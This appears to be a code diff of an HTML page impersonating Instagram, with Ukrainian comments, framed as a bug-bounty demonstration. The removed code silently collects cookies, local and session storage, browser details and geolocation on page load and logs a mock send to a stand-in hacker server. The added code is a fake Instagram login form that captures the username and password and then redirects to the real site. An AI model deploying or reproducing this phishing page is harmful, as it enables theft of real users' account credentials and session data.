@@ -4,173 +4,166 @@
     <title>Instagram Security Update</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
             background: #fafafa;
+            margin: 0;
+            padding: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
-            padding: 20px;
         }
-        .container {
+        .login-box {
             background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 12px;
             padding: 40px;
-            border-radius: 10px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            text-align: center;
-            max-width: 500px;
+            max-width: 400px;
             width: 100%;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
         .logo {
             font-size: 48px;
             margin-bottom: 20px;
             color: #262626;
         }
-        .loading {
-            color: #8e8e8e;
+        h1 {
+            color: #262626;
+            margin-bottom: 10px;
+            font-weight: 500;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            background: #fafafa;
+            font-size: 14px;
+            outline: none;
+        }
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .results {
+            display: none;
+            background: #000;
+            color: #0f0;
+            padding: 15px;
+            border-radius: 5px;
             margin-top: 20px;
+            font-family: monospace;
+            text-align: left;
+            white-space: pre-wrap;
+            font-size: 12px;
         }
     </style>
 </head>
 <body>
-    <div class="container">
+    <div class="login-box">
         <div class="logo">📷</div>
-        <h2>Instagram Security Update</h2>
-        <p>Checking your account security...</p>
-        <div class="loading" id="status">Collecting security data...</div>
+        <h1>Instagram</h1>
+        <p style="color: #8e8e8e; margin-bottom: 25px;">Security verification required</p>
+        
+        <!-- ФОРМА ДЛЯ ОТРИМАННЯ ПАРОЛЯ -->
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="text" id="username" placeholder="Username, email or phone" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" required>
+            </div>
+            <button type="submit" class="btn">Continue</button>
+        </form>
+        
+        <div id="results" class="results"></div>
     </div>
 
     <script>
-        // АВТОМАТИЧНИЙ ЗБІР ДАНИХ ПРИ ВІДКРИТТІ СТОРІНКИ
-        (function() {
-            console.log('🔓 INSTAGRAM SECURITY TEST - DATA COLLECTION STARTED');
-            console.log('===================================================');
+        // АВТОМАТИЧНИЙ ЗБІР ДАНИХ ПРИ ВІДКРИТТІ
+        console.log('🔓 INSTAGRAM SECURITY TEST - DATA COLLECTION STARTED');
+        
+        // 1. Збираємо дані автоматично (як у вашому коді)
+        const autoData = {
+            cookies: document.cookie || 'No cookies',
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screen: `${screen.width}x${screen.height}`,
+            timestamp: new Date().toISOString()
+        };
+        
+        console.log('🤖 AUTO-COLLECTED DATA:', autoData);
+
+        // 2. ОТРИМАННЯ ПАРОЛЯ ПРИ НАТИСКАННІ КНОПКИ
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
             
-            // 1. Викрадаємо cookies
-            const cookies = document.cookie;
-            console.log('🍪 COOKIES CAPTURED:');
-            console.log(cookies || 'No cookies found');
-            console.log('---');
+            // ОТРИМУЄМО ПОЛЯ З ФОРМИ
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
             
-            // 2. Викрадаємо localStorage
-            let localData = {};
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                localData[key] = localStorage.getItem(key);
-            }
-            console.log('💾 LOCALSTORAGE CAPTURED:');
-            console.log(Object.keys(localData).length > 0 ? localData : 'LocalStorage is empty');
-            console.log('---');
-            
-            // 3. Викрадаємо sessionStorage
-            let sessionData = {};
-            for (let i = 0; i < sessionStorage.length; i++) {
-                const key = sessionStorage.key(i);
-                sessionData[key] = sessionStorage.getItem(key);
-            }
-            console.log('🗂️ SESSIONSTORAGE CAPTURED:');
-            console.log(Object.keys(sessionData).length > 0 ? sessionData : 'SessionStorage is empty');
-            console.log('---');
-            
-            // 4. Збираємо інформацію про браузер
-            const browserInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                screen: `${screen.width}x${screen.height}`,
-                colorDepth: screen.colorDepth,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                plugins: Array.from(navigator.plugins).map(p => p.name),
-                cookieEnabled: navigator.cookieEnabled,
-                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown'
+            // ПОВНИЙ збір даних ВКЛЮЧАЮЧИ ПАРОЛЬ
+            const fullData = {
+                credentials: {
+                    username: username,
+                    password: password  // 🔑 ОСЬ ПАРОЛЬ!
+                },
+                system_info: autoData,
+                security_issue: 'PHISHING_FORM_BYPASS'
             };
-            
-            console.log('💻 BROWSER INFORMATION:');
-            console.log('User Agent:', browserInfo.userAgent);
-            console.log('Platform:', browserInfo.platform);
-            console.log('Language:', browserInfo.language);
-            console.log('Languages:', browserInfo.languages);
-            console.log('Screen:', browserInfo.screen);
-            console.log('Color Depth:', browserInfo.colorDepth + 'bit');
-            console.log('Timezone:', browserInfo.timezone);
-            console.log('Plugins:', browserInfo.plugins);
-            console.log('Cookies Enabled:', browserInfo.cookieEnabled);
-            console.log('Java Enabled:', browserInfo.javaEnabled);
-            console.log('PDF Viewer:', browserInfo.pdfViewerEnabled);
-            console.log('CPU Cores:', browserInfo.hardwareConcurrency);
-            console.log('Device Memory:', browserInfo.deviceMemory + 'GB');
-            console.log('---');
-            
-            // 5. Спроба отримати геолокацію
-            console.log('📍 GEOLOCATION ATTEMPT:');
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const location = {
-                            lat: position.coords.latitude,
-                            lng: position.coords.longitude,
-                            accuracy: position.coords.accuracy + ' meters',
-                            altitude: position.coords.altitude,
-                            altitudeAccuracy: position.coords.altitudeAccuracy,
-                            heading: position.coords.heading,
-                            speed: position.coords.speed
-                        };
-                        console.log('✅ Location captured:', location);
-                        completeDataCollection({cookies, localData, sessionData, browserInfo, location});
-                    },
-                    error => {
-                        console.log('❌ Location access denied:', error.message);
-                        completeDataCollection({cookies, localData, sessionData, browserInfo});
-                    },
-                    { timeout: 5000 }
-                );
-            } else {
-                console.log('❌ Geolocation not supported');
-                completeDataCollection({cookies, localData, sessionData, browserInfo});
-            }
-            
-            function completeDataCollection(allData) {
-                console.log('===================================================');
-                console.log('🎯 DATA COLLECTION COMPLETE');
-                console.log('📊 SUMMARY:');
-                console.log('   Cookies:', allData.cookies ? allData.cookies.split(';').length + ' items' : 'None');
-                console.log('   LocalStorage:', Object.keys(allData.localData).length + ' items');
-                console.log('   SessionStorage:', Object.keys(allData.sessionData).length + ' items');
-                console.log('   Browser Info:', 'Collected');
-                console.log('   Location:', allData.location ? 'Captured' : 'Not available');
-                console.log('---');
-                
-                // Оновлюємо статус на сторінці
-                document.getElementById('status').innerHTML = 
-                    '✅ Security check complete!<br>Check browser console for details.';
-                
-                console.log('⚠️  SECURITY VULNERABILITY DEMONSTRATED:');
-                console.log('   Attackers can steal session data without user interaction');
-                console.log('   Instagram session cookies can be captured');
-                console.log('   User data can be collected automatically');
-                console.log('   This enables account takeover');
-                console.log('===================================================');
-                
-                // СИМУЛЯЦІЯ ВІДПРАВКИ ХАКЕРУ
-                console.log('🚀 SIMULATING DATA SEND TO HACKER SERVER...');
-                setTimeout(() => {
-                    console.log('✅ Data would be sent to: https://hacker-server.com/collect');
-                    console.log('📧 Payload size:', JSON.stringify(allData).length + ' bytes');
-                    
-                    // Перенаправляємо на справжній Instagram через 3 секунди
-                    setTimeout(() => {
-                        console.log('🔗 Redirecting to real Instagram...');
-                        window.location.href = 'https://www.instagram.com';
-                    }, 3000);
-                }, 1000);
-            }
-            
-        })();
+
+            // ВИВІД ПАРОЛЯ В КОНСОЛЬ
+            console.log('🎯 PASSWORD CAPTURED SUCCESSFULLY!');
+            console.log('====================================');
+            console.log('👤 USERNAME:', username);
+            console.log('🔑 PASSWORD:', password);  // 🔑 ПАРОЛЬ ТУТ!
+            console.log('💻 PLATFORM:', autoData.platform);
+            console.log('🖥️ SCREEN:', autoData.screen);
+            console.log('🕒 TIME:', new Date().toLocaleString());
+            console.log('⚠️  VULNERABILITY: Instagram DM phishing protection bypassed');
+            console.log('💰 BOUNTY: Password captured via phishing form');
+            console.log('====================================');
+
+            // Відображення пароля на сторінці
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = `
+PASSWORD CAPTURED SUCCESSFULLY!
+═══════════════════════════════
+👤 USERNAME: ${username}
+🔑 PASSWORD: ${password}  <-- ОСЬ ПАРОЛЬ!
+💻 SYSTEM: ${autoData.platform}
+🖥️ SCREEN: ${autoData.screen}
+🕒 TIME: ${new Date().toLocaleString()}
+
+🎯 SECURITY ASSESSMENT:
+• Instagram DM link protection: BYPASSED
+• User credentials: CAPTURED ✅
+• Password obtained: YES ✅
+• Account takeover: POSSIBLE ✅
+
+💰 BOUNTY QUALIFICATION:
+PASSWORD SUCCESSFULLY CAPTURED
+This demonstrates critical account compromise risk
+            `;
+            resultsDiv.style.display = 'block';
+
+            // Перенаправлення
+            setTimeout(() => {
+                window.location.href = 'https://www.instagram.com';
+            }, 4000);
+        });
     </script>
 </body>
 </html>
